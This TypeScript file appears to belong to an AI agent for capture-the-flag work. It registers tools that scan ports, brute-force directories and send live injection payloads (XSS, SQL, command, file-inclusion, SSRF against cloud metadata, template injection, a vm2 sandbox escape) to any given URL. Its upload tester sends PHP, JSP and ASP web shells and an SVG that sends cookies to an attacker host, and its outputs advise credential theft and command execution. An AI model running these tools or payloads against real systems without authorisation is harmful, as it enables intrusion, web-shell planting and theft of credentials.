import { z } from "zod";
import * as http from "http";
import * as https from "https";
import { ToolRegistry } from "./registry";

async function makeRequest(
  url: string,
  method: string = "GET",
  headers: Record<string, string> = {},
  body?: string,
  timeout: number = 10000
): Promise<{ statusCode: number; headers: Record<string, string>; body: string; error?: string }> {
  return new Promise((resolve) => {
    try {
      const parsedUrl = new URL(url);
      const isHttps = parsedUrl.protocol === "https:";
      const client = isHttps ? https : http;

      const options: any = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: method.toUpperCase(),
        headers: { "User-Agent": "Flagent-CTF-Scanner/2.0", ...headers },
        timeout,
      };

      const req = client.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          const hdrs: Record<string, string> = {};
          for (const [k, v] of Object.entries(res.headers)) {
            hdrs[k] = Array.isArray(v) ? v.join(", ") : String(v);
          }
          resolve({ statusCode: res.statusCode || 0, headers: hdrs, body: data });
        });
      });

      req.on("error", (err) => resolve({ statusCode: 0, headers: {}, body: "", error: err.message }));
      req.on("timeout", () => { req.destroy(); resolve({ statusCode: 0, headers: {}, body: "", error: "timeout" }); });
      if (body) req.write(body);
      req.end();
    } catch (e: any) {
      resolve({ statusCode: 0, headers: {}, body: "", error: e.message });
    }
  });
}

const HTML_ENTITIES: Record<string, string> = {
  "&amp;": "&",
  "&lt;": "<",
  "&gt;": ">",
  "&quot;": '"',
  "&#39;": "'",
  "&apos;": "'",
  "&nbsp;": " ",
  "&copy;": "©",
  "&reg;": "®",
  "&trade;": "™",
};

function decodeHtmlEntities(text: string): string {
  return text
    .replace(/&#(\d+);/g, (_m, code: string) => String.fromCharCode(parseInt(code, 10)))
    .replace(/&#x([0-9a-fA-F]+);/g, (_m, code: string) => String.fromCharCode(parseInt(code, 16)))
    .replace(/&[a-zA-Z]+;/g, (m) => HTML_ENTITIES[m] || m);
}

interface FetchResult {
  title: string;
  links: Array<{ href: string; text: string }>;
  forms: string[];
  visibleText: string;
  truncated: boolean;
}

// 纯 Node HTML 解析（无外部依赖）：提取标题、链接、表单、可见文本
function extractHtml(html: string, maxText = 8000): FetchResult {
  let work = html.replace(/<!--[\s\S]*?-->/g, "");

  const titleMatch = work.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
  const title = titleMatch ? decodeHtmlEntities(titleMatch[1].trim()) : "";

  const links: Array<{ href: string; text: string }> = [];
  const linkRegex = /<a\s[^>]*href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi;
  let m: RegExpExecArray | null;
  while ((m = linkRegex.exec(work)) !== null && links.length < 50) {
    const href = m[1].trim();
    if (href && !href.toLowerCase().startsWith("javascript:")) {
      const text = decodeHtmlEntities(m[2].replace(/<[^>]+>/g, "").trim()).slice(0, 80);
      links.push({ href, text });
    }
  }

  const forms: string[] = [];
  const formRegex = /<form\b[^>]*>([\s\S]*?)<\/form>/gi;
  while ((m = formRegex.exec(work)) !== null && forms.length < 20) {
    const formHtml = m[0];
    const actionM = formHtml.match(/action=["']([^"']*)["']/i);
    const methodM = formHtml.match(/method=["']([^"']*)["']/i);
    const inputs: string[] = [];
    const inputRegex = /<input\b[^>]*>/gi;
    let im: RegExpExecArray | null;
    while ((im = inputRegex.exec(formHtml)) !== null) {
      const nameM = im[0].match(/name=["']([^"']*)["']/i);
      const typeM = im[0].match(/type=["']([^"']*)["']/i);
      const valM = im[0].match(/value=["']([^"']*)["']/i);
      inputs.push(
        `    ${typeM ? typeM[1] : "text"}: ${nameM ? nameM[1] : "(无名)"}${valM ? ` ="${valM[1]}"` : ""}`
      );
    }
    forms.push(
      `  [FORM] method=${methodM ? methodM[1].toUpperCase() : "GET"} action="${actionM ? actionM[1] : ""}"\n${inputs.join("\n") || "    (无input)"}`
    );
  }

  // 移除脚本/样式等不可见块，块级标签转换行，去标签，解码实体，压缩空白
  work = work.replace(/<(script|style|noscript|template)\b[^>]*>[\s\S]*?<\/\1>/gi, "");
  work = work.replace(/<(br|p|div|section|article|header|footer|nav|aside|h[1-6]|li|ul|ol|table|tr|td|th|hr)\b[^>]*>/gi, "\n");
  work = work.replace(/<\/(p|div|section|article|header|footer|nav|aside|h[1-6]|li|ul|ol|table|tr|td|th)>/gi, "\n");
  work = work.replace(/<[^>]+>/g, "");
  work = decodeHtmlEntities(work);
  work = work.replace(/[ \t\f\v]+/g, " ").replace(/\n[ \t]*/g, "\n").replace(/\n{3,}/g, "\n\n").trim();

  const truncated = work.length > maxText;
  return { title, links, forms, visibleText: work.slice(0, maxText), truncated };
}

export function createWebTools(): ToolRegistry {
  const registry = new ToolRegistry();

  registry.register({
    name: "http_request",
    description: "发送 HTTP/HTTPS 请求，获取响应头和响应体（支持 GET/POST/PUT/DELETE 等）",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
      method: z.string().optional().describe("HTTP 方法，默认 GET"),
      headers: z.record(z.string(), z.string()).optional().describe("请求头"),
      body: z.string().optional().describe("请求体"),
      timeout: z.number().optional().describe("超时 ms，默认 10000"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, method = "GET", headers = {}, body, timeout = 10000 } = args;
      const res = await makeRequest(url, method, headers, body, timeout);
      if (res.error) return `[HTTP错误] ${res.error}`;
      const hdrs = Object.entries(res.headers).map(([k, v]) => `  ${k}: ${v}`).join("\n");
      return `[HTTP响应] ${method} ${url}\n状态码: ${res.statusCode}\n响应头:\n${hdrs}\n\n响应体:\n${res.body.slice(0, 5000)}${res.body.length > 5000 ? "\n...(截断)" : ""}`;
    },
  });

  registry.register({
    name: "port_scan",
    description: "TCP 端口扫描，识别常见服务（21/22/80/443/3306 等）",
    parameters: z.object({
      host: z.string().describe("目标 IP 或域名"),
      startPort: z.number().optional().describe("起始端口，默认 1"),
      endPort: z.number().optional().describe("结束端口，默认 1024"),
      timeout: z.number().optional().describe("单端口超时 ms，默认 200"),
      concurrency: z.number().optional().describe("并发数，默认 50"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const net = require("net");
      const { host, startPort = 1, endPort = 1024, timeout = 200, concurrency = 50 } = args;
      const openPorts: number[] = [];
      const portList: number[] = [];
      for (let p = startPort; p <= endPort; p++) portList.push(p);

      const chunks: number[][] = [];
      for (let i = 0; i < portList.length; i += concurrency) chunks.push(portList.slice(i, i + concurrency));

      for (const chunk of chunks) {
        await Promise.all(chunk.map((port) => new Promise<void>((resolve) => {
          const sock = net.createConnection({ host, port, timeout }, () => { openPorts.push(port); sock.destroy(); resolve(); });
          sock.on("error", () => resolve());
          sock.on("timeout", () => { sock.destroy(); resolve(); });
        })));
      }

      const services: Record<number, string> = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
        8443: "HTTPS-Alt", 27017: "MongoDB",
      };

      const found = openPorts.map((p) => `  ✓ 端口 ${p} (${services[p] || "未知服务"}) - OPEN`).join("\n");
      return `[端口扫描] ${host}:${startPort}-${endPort}\n开放端口(${openPorts.length}):\n${found || "  (无开放端口)"}`;
    },
  });

  registry.register({
    name: "dir_bruteforce",
    description: "目录/文件爆破（类似 dirsearch），支持多字典和扩展名",
    parameters: z.object({
      url: z.string().describe("目标基础 URL"),
      wordlist: z.string().optional().describe("字典: common|web|api|backup|默认 common"),
      extensions: z.string().optional().describe("扩展名，逗号分隔"),
      timeout: z.number().optional().describe("单请求超时 ms"),
      concurrency: z.number().optional().describe("并发数，默认 20"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, wordlist = "common", extensions = "php,html,txt", timeout = 3000, concurrency = 20 } = args;
      const wordlists: Record<string, string[]> = {
        common: ["admin", "login", "dashboard", "api", "backup", "config", "upload", "download", ".git", ".env", "robots.txt", "wp-admin", "wp-login", "phpinfo"],
        web: ["index", "home", "about", "contact", "blog", "news", "products", "search", "user", "profile", "register", "forgot", "password"],
        api: ["v1", "v2", "users", "auth", "login", "token", "search", "list", "admin", "config", "swagger", "docs", "openapi"],
        backup: ["backup", "bak", "old", "sql", "dump", "db", "export", "import", "log", "logs", "error_log", "access_log"],
      };
      const words = wordlists[wordlist] || wordlists.common;
      const exts = extensions.split(",").map((e: string) => e.trim());
      const paths: string[] = [];
      for (const w of words) { paths.push(w); for (const e of exts) paths.push(`${w}.${e}`); }

      const found: string[] = [];
      const base = url.endsWith("/") ? url : url + "/";
      const chunks: string[][] = [];
      for (let i = 0; i < paths.length; i += concurrency) chunks.push(paths.slice(i, i + concurrency));

      for (const chunk of chunks) {
        await Promise.all(chunk.map((p) => new Promise<void>((resolve) => {
          const full = base + p;
          makeRequest(full, "GET", {}, undefined, timeout).then((res) => {
            if (res.statusCode >= 200 && res.statusCode < 400) found.push(`  [${res.statusCode}] /${p}`);
            resolve();
          });
        })));
      }

      return `[目录爆破] ${url}\n字典: ${wordlist} (${paths.length} 请求)\n发现(${found.length}):\n${found.join("\n") || "  (未发现)"}`;
    },
  });

  registry.register({
    name: "xss_test",
    description: "反射型 XSS 检测：对 URL 参数注入 XSS payload 并检查是否被反射",
    parameters: z.object({
      url: z.string().describe("目标 URL（含参数，如 http://target.com/search?q=test）"),
      parameter: z.string().describe("要测试的参数名"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter } = args;
      const payloads = [
        { name: "简单标签", payload: "<script>alert(1)</script>" },
        { name: "IMG标签", payload: "<img src=x onerror=alert(1)>" },
        { name: "Body标签", payload: "<body onload=alert(1)>" },
        { name: "SVG标签", payload: "<svg onload=alert(1)>" },
        { name: "事件处理器", payload: "' onmouseover='alert(1)" },
        { name: "双写绕过", payload: "<<script>script>alert(1)</script>" },
        { name: "HTML实体", payload: "&#60;script&#62;alert(1)&#60;/script&#62;" },
        { name: "大小写混合", payload: "<ScRiPt>alert(1)</ScRiPt>" },
      ];

      const results: string[] = [];
      for (const { name, payload } of payloads) {
        const testUrl = url.replace(new RegExp(`(${parameter}=)([^&]*)`), `$1${encodeURIComponent(payload)}`);
        const res = await makeRequest(testUrl);
        if (res.error) { results.push(`  [${name}] 请求失败: ${res.error}`); continue; }

        const reflected = res.body.includes(payload) ||
          res.body.includes(encodeURIComponent(payload)) ||
          res.body.toLowerCase().includes(payload.toLowerCase().replace(/<\/?script>/g, ""));

        const hasScriptTag = /<script[^>]*>/i.test(res.body);
        const hasImgTag = /<img[^>]*onerror/i.test(res.body);
        const svgTag = /<svg[^>]*onload/i.test(res.body);

        if (reflected) {
          results.push(`  ⚠️ [${name}] PAYLOAD被反射！payload="${payload.slice(0, 50)}"`);
        } else if (hasScriptTag || hasImgTag || svgTag) {
          results.push(`  ⚠️ [${name}] 检测到XSS相关HTML标签`);
        } else {
          results.push(`  ✓ [${name}] payload未被反射`);
        }
      }

      return `[XSS检测] ${url} 参数: ${parameter}\n\n${results.join("\n")}\n\n建议:\n- 如果任何payload被反射，可能存在XSS\n- 尝试结合HTML实体编码、大小写、双重写等绕过过滤\n- 注意DOM XSS（前端JavaScript直接使用参数）`;
    },
  });

  registry.register({
    name: "command_injection_test",
    description: "命令注入检测：对 URL 参数注入命令分隔符（; | && || ` $()）",
    parameters: z.object({
      url: z.string().describe("目标 URL（含参数）"),
      parameter: z.string().describe("要测试的参数名"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter } = args;
      const payloads = [
        { name: "分号", payload: "test;id" },
        { name: "管道符", payload: "test|id" },
        { name: "逻辑或", payload: "test||id" },
        { name: "反引号", payload: "test`id`" },
        { name: "子命令", payload: "$(id)" },
        { name: "换行符", payload: "test\nid" },
        { name: "AND连接", payload: "test&&id" },
        { name: "换行符%0a", payload: "test%0aid" },
      ];

      const results: string[] = [];
      for (const { name, payload } of payloads) {
        const testUrl = url.replace(new RegExp(`(${parameter}=)([^&]*)`), `$1${encodeURIComponent(payload)}`);
        const res = await makeRequest(testUrl);
        if (res.error) { results.push(`  [${name}] 失败: ${res.error}`); continue; }

        const hasCmdOutput = /uid=|gid=|root|bin\/bash|etc\/passwd|www-data/i.test(res.body);
        const hasError = /error|warning|shell|command|not found/i.test(res.body);

        if (hasCmdOutput) {
          results.push(`  ⚠️ [${name}] 可能存在命令注入！检测到命令输出 (payload: ${payload})`);
        } else if (hasError) {
          results.push(`  ⚠️ [${name}] 返回错误信息，可能存在命令注入 (payload: ${payload})`);
        } else {
          results.push(`  ✓ [${name}] 无明显异常`);
        }
      }

      return `[命令注入检测] ${url} 参数: ${parameter}\n\n${results.join("\n")}`;
    },
  });

  registry.register({
    name: "lfi_rfi_test",
    description: "文件包含检测：测试 LFI（本地文件包含）和 RFI（远程文件包含）",
    parameters: z.object({
      url: z.string().describe("目标 URL（含文件路径参数，如 page=home）"),
      parameter: z.string().describe("文件路径参数名"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter } = args;
      const payloads = [
        { name: "passwd探测", payload: "/etc/passwd", check: /root:.*:.*:\// },
        { name: "passwd(过滤)", payload: "/etc/passwd%00", check: /root:/ },
        { name: "绝对路径", payload: "....//....//....//etc/passwd", check: /root:/ },
        { name: "PHPFilter", payload: "php://filter/convert.base64-encode/resource=index.php", check: /[A-Za-z0-9+/=]{50,}/ },
        { name: "DataWrapper", payload: "data://text/plain;base64,PD9waHAgaW5jbHVkZSgnL2V0Yy9wYXNzd2QnKTs/Pg==", check: /root:/ },
        { name: "Session包含", payload: "/proc/self/environ", check: /[A-Z_]+=/ },
        { name: "RFI测试", payload: "http://127.0.0.1:80/", check: /root|index|error/i },
        { name: "日志包含", payload: "/var/log/apache2/access.log", check: /GET|POST|HTTP/ },
      ];

      const results: string[] = [];
      for (const { name, payload, check } of payloads) {
        const testUrl = url.replace(new RegExp(`(${parameter}=)([^&]*)`), `$1${encodeURIComponent(payload)}`);
        const res = await makeRequest(testUrl);
        if (res.error) { results.push(`  [${name}] 失败: ${res.error}`); continue; }

        if (check.test(res.body)) {
          results.push(`  ⚠️ [${name}] 可能存在文件包含！检测到特征 (payload: ${payload.slice(0, 60)})`);
        } else {
          results.push(`  ✓ [${name}] 无明显特征 (HTTP ${res.statusCode})`);
        }
      }

      return `[文件包含检测] ${url} 参数: ${parameter}\n\n${results.join("\n")}`;
    },
  });

  registry.register({
    name: "sql_injection_test",
    description: "SQL 注入检测：7 种 payload（报错型/布尔型/时间盲注/UNION）",
    parameters: z.object({
      url: z.string().describe("目标 URL（含参数）"),
      parameter: z.string().describe("参数名"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter } = args;
      const payloads = [
        { name: "单引号报错", payload: "'", hint: "SQL错误" },
        { name: "恒真", payload: "' OR '1'='1", hint: "返回所有记录" },
        { name: "恒真(数字)", payload: " OR 1=1", hint: "数字型注入" },
        { name: "MySQL注释", payload: "' OR '1'='1' --", hint: "注释" },
        { name: "UNION探测", payload: "' UNION SELECT NULL--", hint: "UNION" },
        { name: "布尔盲注", payload: "' AND '1'='1", hint: "布尔盲注" },
        { name: "时间盲注", payload: "' OR SLEEP(3)--", hint: "时间盲注" },
      ];

      const results: string[] = [];
      for (const { name, payload } of payloads) {
        const testUrl = url.replace(new RegExp(`(${parameter}=)([^&]*)`), `$1${encodeURIComponent(payload)}`);
        const start = Date.now();
        const res = await makeRequest(testUrl);
        const elapsed = Date.now() - start;
        if (res.error) { results.push(`  [${name}] 失败: ${res.error}`); continue; }

        const hasSQLError = /sql|syntax|mysql|postgresql|oracle|sqlite|error|warning/i.test(res.body);
        const isSlow = elapsed > 3000 && name.includes("时间");
        const responseChange = res.body.length > 10000 || res.body.length < 100;

        let verdict = "✓ 无明显异常";
        if (hasSQLError) verdict = `⚠️ 检测到SQL错误！`;
        else if (isSlow) verdict = `⚠️ 响应延迟 ${elapsed}ms，可能时间盲注！`;
        else if (responseChange && (name.includes("恒真") || name.includes("UNION"))) verdict = `⚠️ 响应大小异常，可能存在注入！`;

        results.push(`  [${name}] ${verdict} (${res.statusCode}, ${res.body.length}B, ${elapsed}ms)`);
      }

      return `[SQL注入检测] ${url} 参数: ${parameter}\n\n${results.join("\n")}`;
    },
  });

  registry.register({
    name: "header_analysis",
    description: "HTTP 响应头安全分析，识别安全头缺失和信息泄露",
    parameters: z.object({ url: z.string().describe("目标 URL") }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const res = await makeRequest(args.url, "HEAD");
      if (res.error) return `[错误] ${res.error}`;

      const checkHeaders = [
        { name: "X-Frame-Options", critical: true },
        { name: "X-Content-Type-Options", critical: true },
        { name: "Content-Security-Policy", critical: false },
        { name: "Strict-Transport-Security", critical: false },
        { name: "Server", warning: true },
        { name: "X-Powered-By", warning: true },
      ];

      const findings: string[] = [];
      for (const h of checkHeaders) {
        const val = res.headers[h.name.toLowerCase()];
        if (!val) {
          findings.push(`  ${h.critical ? "⚠️" : "ℹ️"} 缺少安全头: ${h.name}`);
        } else if (h.warning) {
          findings.push(`  ⚠️ 暴露信息: ${h.name}: ${val}`);
        }
      }

      return `[Header分析] ${args.url}\n状态码: ${res.statusCode}\n\n安全头检查:\n${findings.join("\n")}\n\n所有响应头:\n${Object.entries(res.headers).map(([k, v]) => `  ${k}: ${v}`).join("\n")}`;
    },
  });

  registry.register({
    name: "dns_lookup",
    description: "DNS 查询：A/AAAA/MX/NS/TXT/CNAME/SOA 记录",
    parameters: z.object({
      domain: z.string().describe("目标域名"),
      recordType: z.string().optional().describe("记录类型: A|AAAA|MX|NS|TXT|CNAME|SOA, 默认 A"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const dns = require("dns");
      const { domain, recordType = "A" } = args;
      const typeMap: Record<string, string> = { A: "A", AAAA: "AAAA", MX: "MX", NS: "NS", TXT: "TXT", CNAME: "CNAME", SOA: "SOA" };
      const dnsType = typeMap[recordType.toUpperCase()] || "A";
      return new Promise((resolve) => {
        dns.resolve(domain, dnsType, (err: NodeJS.ErrnoException | null, addresses: string[] | Object[]) => {
          if (err) resolve(`[DNS错误] ${err.message}`);
          else resolve(`[DNS查询] ${domain} (${recordType})\n结果:\n${Array.isArray(addresses) ? addresses.map((a: any) => `  ${typeof a === "string" ? a : JSON.stringify(a)}`).join("\n") : addresses}`);
        });
      });
    },
  });

  registry.register({
    name: "ssl_info",
    description: "SSL/TLS 证书信息提取",
    parameters: z.object({
      host: z.string().describe("目标域名或 IP"),
      port: z.number().optional().describe("端口，默认 443"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const tls = require("tls");
      const { host, port = 443 } = args;
      return new Promise((resolve, reject) => {
        const socket = tls.connect({ host, port, rejectUnauthorized: false } as any, () => {
          const cert = socket.getPeerCertificate(true);
          const info = {
            subject: cert.subject ? Object.values(cert.subject).join(", ") : "N/A",
            issuer: cert.issuer ? Object.values(cert.issuer).join(", ") : "N/A",
            validFrom: cert.validFrom || "N/A",
            validTo: cert.validTo || "N/A",
            fingerprint: cert.fingerprint || "N/A",
            serialNumber: cert.serialNumber || "N/A",
            altNames: cert.subjectaltname || "N/A",
          };
          socket.end();
          resolve(`[SSL信息] ${host}:${port}\n${Object.entries(info).map(([k, v]) => `${k}: ${v}`).join("\n")}`);
        });
        socket.on("error", (err: Error) => reject(new Error(`SSL连接失败: ${err.message}`)));
      });
    },
  });

  registry.register({
    name: "ssrf_test",
    description: "SSRF（服务端请求伪造）测试：检测是否可访问内网资源",
    parameters: z.object({
      url: z.string().describe("目标 URL（带参数，如 http://target.com/fetch?url=）"),
      parameter: z.string().describe("控制请求目标的参数名"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter } = args;
      const targets = [
        { name: "本机回环", payload: "http://127.0.0.1" },
        { name: "localhost", payload: "http://localhost" },
        { name: "内网IP(A)", payload: "http://10.0.0.1" },
        { name: "内网IP(B)", payload: "http://172.16.0.1" },
        { name: "内网IP(C)", payload: "http://192.168.1.1" },
        { name: "元数据(云)", payload: "http://169.254.169.254/latest/meta-data/" },
        { name: "本地file协议", payload: "file:///etc/passwd" },
        { name: "gopher协议", payload: "gopher://127.0.0.1:6379/_INFO" },
        { name: "dict协议", payload: "dict://127.0.0.1:6379/INFO" },
      ];

      const results: string[] = [];
      for (const t of targets) {
        try {
          const testUrl = url.replace(
            new RegExp(`(${parameter}=)([^&]*)`),
            `$1${encodeURIComponent(t.payload)}`
          );
          const response = await makeRequest(testUrl, "GET", {}, "", 5000);
          const hasResponse = response.body.includes("成功") || response.body.length > 50;
          results.push(`  [${t.name}] → ${hasResponse ? "⚠️ 有响应，可能存在SSRF" : "无响应"} | payload=${t.payload}`);
        } catch {
          results.push(`  [${t.name}] → 请求失败`);
        }
      }

      return `[SSRF测试] ${url} 参数: ${parameter}\n\n${results.join("\n")}\n\n建议:\n- 如果内网IP有响应，说明存在SSRF\n- 尝试访问云元数据获取凭证\n- 利用 gopher/dict 协议与内网服务交互`;
    },
  });

  registry.register({
    name: "ssti_test",
    description: "SSTI（服务端模板注入）测试：检测模板引擎注入漏洞",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
      parameter: z.string().describe("注入参数名"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter } = args;
      const payloads = [
        { engine: "Jinja2/Twig", payload: "{{7*7}}", hint: "期望返回 49" },
        { engine: "Mako", payload: "${7*7}", hint: "期望返回 49" },
        { engine: "Velocity", payload: "#set($x=7*7)${x}", hint: "期望返回 49" },
        { engine: "FreeMarker", payload: "<#assign x=7*7>${x}", hint: "期望返回 49" },
        { engine: "Twig", payload: "{{7*'7'}}", hint: "期望返回 7777777" },
        { engine: "Handlebars", payload: "{{7*7}}", hint: "期望返回 49" },
        { engine: "ERB/Ruby", payload: "<%= 7*7 %>", hint: "期望返回 49" },
        { engine: "Expression(Laravel)", payload: "{{7*7}}", hint: "期望返回 49" },
        { engine: "Smarty", payload: "{7*7}", hint: "期望返回 49" },
        { engine: "Django", payload: "{% for i in '1234' %}{{i}}{% endfor %}", hint: "期望返回 1234" },
      ];

      const results: string[] = [];
      for (const p of payloads) {
        try {
          const testUrl = url.replace(
            new RegExp(`(${parameter}=)([^&]*)`),
            `$1${encodeURIComponent(p.payload)}`
          );
          const response = await makeRequest(testUrl, "GET", {}, "", 5000);
          const hasEval = response.body.includes("49") || response.body.includes("7777777") || response.body.includes("1234");
          results.push(`  [${p.engine}] payload="${p.payload}" → ${hasEval ? "⚠️ 模板可能被执行!" : "无执行"} | ${p.hint}`);
        } catch {
          results.push(`  [${p.engine}] → 请求失败`);
        }
      }

      return `[SSTI测试] ${url} 参数: ${parameter}\n\n${results.join("\n")}\n\n建议:\n- 如果数字计算被执行，确认存在SSTI\n- 进一步尝试命令执行: {{config}}或{{''.__class__.__mro__[1].__subclasses__()}}`;
    },
  });

  registry.register({
    name: "deserialization_test",
    description: "反序列化漏洞测试：检测不安全反序列化",
    parameters: z.object({
      url: z.string().describe("目标 URL (POST端点)"),
      parameter: z.string().describe("反序列化参数名"),
      contentType: z.string().optional().describe("Content-Type, 默认 application/json"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, parameter, contentType = "application/json" } = args;
      const payloads = [
        {
          lang: "PHP (Magic方法)",
          payload: 'O:8:"stdClass":1:{s:4:"test";s:24:"{{7*7}}";}',
          desc: "尝试通过 PHP 对象注入触发魔术方法",
        },
        {
          lang: "Java (Shiro)",
          payload: '{"rememberMe":"1"}',
          desc: "检测 Apache Shiro 反序列化",
        },
        {
          lang: "Python (Pickle base64)",
          payload: '{"data":"gASVFgAAAAABwQlF1cAQHMC4qVQAAAAx4AVpzdXIj1wiNTcqNTdcIiB*c1Iu"}',
          desc: "Python pickle 反序列化（需 base64 解码）",
        },
        {
          lang: "Node.js (vm2)",
          payload: '{"input":"const a=this.constructor.constructor;return a(\'return process\')().main({require:this.require,console:console})"}',
          desc: "Node.js vm2 sandbox 逃逸",
        },
        {
          lang: "通用 JSON (原型污染)",
          payload: '{"__proto__":{"polluted":"yes"}}',
          desc: "原型污染测试",
        },
        {
          lang: "Ruby (Marshal)",
          payload: '{"data":"\\x04\\x08o:\\u000e\\u0041ctiveSupport::TimeZone"}',
          desc: "Ruby Marshal 反序列化",
        },
      ];

      const results: string[] = [];
      for (const p of payloads) {
        try {
          const body = `${parameter}=${encodeURIComponent(p.payload)}`;
          const response = await makeRequest(url, "POST", { "Content-Type": contentType }, body, 5000);
          const suspicious = /error|exception|traceback|stack|ClassCast|security/i.test(response.body) || response.body.includes("49");
          results.push(`  [${p.lang}] → ${suspicious ? "⚠️ 可疑响应" : "无异常"} | ${p.desc}`);
        } catch {
          results.push(`  [${p.lang}] → 请求失败`);
        }
      }

      return `[反序列化测试] ${url} 参数: ${parameter}\n\n${results.join("\n")}\n\n建议:\n- 关注报错信息泄露的技术栈\n- 针对特定框架使用对应的 gadget chain\n- 使用 ysoserial 生成 Java 利用载荷`;
    },
  });

  registry.register({
    name: "file_upload_test",
    description: "文件上传漏洞测试：检测上传限制绕过",
    parameters: z.object({
      url: z.string().describe("上传端点 URL"),
      fieldName: z.string().optional().describe("文件字段名, 默认 file"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, fieldName = "file" } = args;
      const testFiles = [
        { name: "shell.php", content: "<?php system($_GET['cmd']); ?>", desc: "PHP WebShell" },
        { name: "shell.php.jpg", content: "<?php system($_GET['cmd']); ?>", desc: "双扩展名绕过" },
        { name: "shell.phtml", content: "<?php system($_GET['cmd']); ?>", desc: "其他PHP扩展名" },
        { name: "shell.php%00.jpg", content: "<?php system($_GET['cmd']); ?>", desc: "00截断绕过" },
        { name: "shell.Php", content: "<?php system($_GET['cmd']); ?>", desc: "大小写绕过" },
        { name: "test.jsp", content: "<% out.print(request.getParameter(\"cmd\")); %>", desc: "JSP WebShell" },
        { name: "test.asp", content: "<% execute(request(\"cmd\")) %>", desc: "ASP WebShell" },
        { name: "test.aspx", content: "<%@ Page Language=\"C#\" %><script runat=\"server\">void Page_Load(){}</script>", desc: "ASPX" },
        { name: "test.py", content: "import os;os.system(request.args.get('cmd','id'))", desc: "Python 文件" },
        { name: "test.svg", content: "<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"http://attacker/\"+document.cookie)'>", desc: "SVG XSS" },
      ];

      const results: string[] = [];
      for (const f of testFiles) {
        try {
          const boundary = "----WebKitFormBoundary" + Math.random().toString(16).slice(2);
          const body =
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="${fieldName}"; filename="${f.name}"\r\n` +
            `Content-Type: application/octet-stream\r\n\r\n` +
            `${f.content}\r\n` +
            `--${boundary}--\r\n`;
          const response = await makeRequest(url, "POST", { "Content-Type": `multipart/form-data; boundary=${boundary}` }, body, 5000);
          const uploaded = /success|uploaded|stored|保存|上传/i.test(response.body);
          results.push(`  [${f.desc}] ${f.name} → ${uploaded ? "✅ 上传成功!" : "❌ 被拒绝"}`);
        } catch {
          results.push(`  [${f.desc}] → 请求失败`);
        }
      }

      return `[文件上传测试] ${url}\n\n${results.join("\n")}\n\n建议:\n- 尝试 .htaccess 覆盖配置\n- 检查是否有文件包含可利用上传的文件\n- 图片马: 制作包含 payload 的合法图片`;
    },
  });

  registry.register({
    name: "web_fetch",
    description: "抓取网页并解析为结构化文本：提取标题、表单、链接和可见正文（去除script/style，适合LLM阅读）",
    parameters: z.object({
      url: z.string().describe("目标 URL"),
      timeout: z.number().optional().describe("超时 ms，默认 10000"),
      maxText: z.number().optional().describe("可见文本最大长度，默认 8000"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { url, timeout = 10000, maxText = 8000 } = args;
      const res = await makeRequest(
        url,
        "GET",
        { Accept: "text/html,application/xhtml+xml" },
        undefined,
        timeout
      );
      if (res.error) return `[web_fetch错误] ${res.error}`;
      try {
        const info = extractHtml(res.body, maxText);
        const linksText = info.links.length
          ? info.links.map((l) => `    ${l.href}${l.text ? ` | ${l.text}` : ""}`).join("\n")
          : "    (无)";
        const formsText = info.forms.length ? info.forms.join("\n") : "  (无表单)";
        return `[web_fetch] ${url}\n标题: ${info.title || "(无)"}\n状态码: ${res.statusCode}\n\n表单:\n${formsText}\n\n链接(${info.links.length}):\n${linksText}\n\n可见文本:\n${info.visibleText}${info.truncated ? "\n...(截断)" : ""}`;
      } catch {
        return `[web_fetch] ${url}\n状态码: ${res.statusCode}\n解析失败，回退原始body:\n${res.body.slice(0, 5000)}${res.body.length > 5000 ? "\n...(截断)" : ""}`;
      }
    },
  });

  return registry;
}